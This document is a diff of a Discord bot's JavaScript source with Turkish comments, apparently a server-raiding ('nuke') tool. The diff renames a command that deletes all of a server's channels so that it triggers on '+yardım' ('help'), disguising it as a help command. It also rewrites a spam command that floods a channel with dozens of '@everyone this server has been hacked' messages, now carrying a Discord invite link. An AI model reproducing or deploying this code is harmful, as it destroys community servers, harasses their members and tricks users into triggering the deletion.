@@ -47,7 +47,7 @@ client.on("message", msg => {
 });
 
 client.on("message", async msg => {
-  if (msg.content === "+çökert") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
@@ -1463,71 +1463,92 @@ client.on("message", async msg => {
 
 client.on('message', msg => {
   if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD');
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); //www.youtube.com/enesacaryoutube TARAFINDAN YAPILMISTIR
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD');
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
-    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD'); 
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf'); 
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf'); 
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf'); 
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
